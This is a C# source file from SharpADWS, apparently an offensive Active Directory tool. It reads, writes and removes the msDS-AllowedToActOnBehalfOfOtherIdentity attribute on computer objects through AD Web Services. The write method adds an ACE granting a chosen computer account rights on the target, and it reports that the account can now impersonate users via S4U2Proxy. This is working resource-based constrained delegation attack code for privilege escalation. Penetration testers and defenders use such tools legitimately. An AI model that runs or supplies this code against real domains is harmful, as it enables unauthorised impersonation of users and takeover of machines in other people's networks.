using SharpADWS.ADWS.Enumeration;
using SharpADWS.ADWS.Transfer;
using SharpADWS.ADWS;
using System;
using System.Collections.Generic;
using System.DirectoryServices.Protocols;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.AccessControl;
using System.Security.Principal;
using System.DirectoryServices;
using System.ServiceModel.Channels;
using System.Data;
using System.Xml.Linq;

namespace SharpADWS.Methods
{
    internal class AllowedToAct
    {
        private ADWSConnection adwsConnection = null;
        private string DefaultNamingContext = null;

        public AllowedToAct(ADWSConnection adwsConnection)
        {
            this.adwsConnection = adwsConnection;
            this.DefaultNamingContext = adwsConnection.DefaultNamingContext;
        }

        public void ReadAllowedToAct(string delegateTo)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(objectClass=computer)(sAMAccountName={delegateTo}))", this.DefaultNamingContext, "subtree", new string[] { "msDS-AllowedToActOnBehalfOfOtherIdentity" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to modify does not exist! (forgot \"$\" for a computer account?)");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.MsDSAllowedToActOnBehalfOfOtherIdentity == null)
                {
                    Console.WriteLine("[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty");
                    return;
                }

                if (adObject.Class == "computer")
                {
                    LdapResolve ldapResolve = new LdapResolve();

                    Console.WriteLine("[*] Accounts allowed to act on behalf of other identity:");

                    foreach (ActiveDirectoryAccessRule ADRule in adObject.MsDSAllowedToActOnBehalfOfOtherIdentity.GetAccessRules(true, true, typeof(SecurityIdentifier)))
                    {
                        if(ADRule.ActiveDirectoryRights == ActiveDirectoryRights.GenericAll ||
                          ADRule.AccessControlType == AccessControlType.Allow)
                        {
                            string objectSid = ADRule.IdentityReference.ToString();

                            List<ADObject> identityObjects = enumerateRequest.Enumerate($"(objectSid={objectSid})", this.DefaultNamingContext, "subtree", new string[] { "sAMAccountName" });
                            foreach (ADObject iObject in identityObjects)
                            {
                                string delegateFrom = iObject.SAMAccountName;
                                Console.WriteLine($"[*]     {delegateFrom}    ({objectSid})");
                            }
                        }
                    }
                }
            }
        }

        public void WriteAllowedToAct(string delegateTo, string delegateFrom)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(ObjectClass=computer)(sAMAccountName={delegateTo}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to modify does not exist! (forgot \"$\" for a computer account?)");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.Class == "computer")
                {
                    string objectSid = ReadComputerSid(delegateFrom);

                    if (String.IsNullOrEmpty(objectSid))
                    {
                        return;
                    }

                    ActiveDirectorySecurity activeDirectorySecurity = adObject.MsDSAllowedToActOnBehalfOfOtherIdentity;

                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = null;

                    if (activeDirectorySecurity != null)
                    {
                        activeDirectorySecurity.SetOwner(new SecurityIdentifier("S-1-5-32-544"));
                        activeDirectorySecurity.AddAccessRule(CreateAllowToActAce(objectSid));
                        modifyResponse = putRequest.ModifyRequest(adObject.DistinguishedName, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", activeDirectorySecurity.GetSecurityDescriptorBinaryForm());
                    }
                    else
                    {
                        Console.WriteLine("[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty");
                        string nTSecurityDescriptor = $"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{objectSid})";
                        RawSecurityDescriptor rawSecurityIdentifier = new RawSecurityDescriptor(nTSecurityDescriptor);
                        byte[] descriptorBuffer = new byte[rawSecurityIdentifier.BinaryLength];
                        rawSecurityIdentifier.GetBinaryForm(descriptorBuffer, 0);
                        modifyResponse = putRequest.ModifyRequest(adObject.DistinguishedName, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptorBuffer);
                    }

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine("[*] Delegation rights modified successfully!");
                        Console.WriteLine($"[*] {delegateFrom} can now impersonate users on {delegateTo} via S4U2Proxy");
                        Console.WriteLine("[*] Accounts allowed to act on behalf of other identity:");
                        Console.WriteLine($"[*]     {delegateFrom}    ({objectSid})");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Delegation rights modifiy failed!");
                    }
                }
            }
        }

        public void RemoveAllowedToAct(string delegateTo, string delegateFrom)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(ObjectClass=computer)(sAMAccountName={delegateTo}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to modify does not exist! (forgot \"$\" for a computer account?)");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.MsDSAllowedToActOnBehalfOfOtherIdentity == null)
                {
                    Console.WriteLine("[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty");
                    return;
                }

                if (adObject.Class == "computer")
                {
                    string objectSid = ReadComputerSid(delegateFrom);

                    if(String.IsNullOrEmpty(objectSid))
                    {
                        return;
                    }

                    ActiveDirectorySecurity activeDirectorySecurity = adObject.MsDSAllowedToActOnBehalfOfOtherIdentity;

                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = null;

                    if (activeDirectorySecurity != null)
                    {
                        activeDirectorySecurity.SetOwner(new SecurityIdentifier("S-1-5-32-544"));
                        activeDirectorySecurity.RemoveAccessRule(CreateAllowToActAce(objectSid));
                        modifyResponse = putRequest.ModifyRequest(adObject.DistinguishedName, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", activeDirectorySecurity.GetSecurityDescriptorBinaryForm());
                    }

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine("[*] Delegation rights modified successfully!");
                        Console.WriteLine("[*] Accounts allowed to act on behalf of other identity has been removed:");
                        Console.WriteLine($"[*]     {delegateFrom}    ({objectSid})");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Delegation rights modifiy failed!");
                    }
                }
            }
        }

        private string ReadComputerSid(string delegateFrom)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(objectClass=computer)(sAMAccountName={delegateFrom}))", adwsConnection.DefaultNamingContext, "subtree", new string[] {
                "objectSid"
            });

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to escalate does not exist! (forgot \"$\" for a computer account?)");
                return null;
            }

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.Class == "computer" && adObject.ObjectSid != null)
                {
                    return adObject.ObjectSid.ToString();
                }
            }

            return null;
        }

        private ActiveDirectoryAccessRule CreateAllowToActAce(string objectSid)
        {
            SecurityIdentifier sid = new SecurityIdentifier(objectSid);
            ActiveDirectoryAccessRule adRule = new ActiveDirectoryAccessRule(sid, ActiveDirectoryRights.GenericAll, AccessControlType.Allow);
            return adRule;
        }
        
    }
}
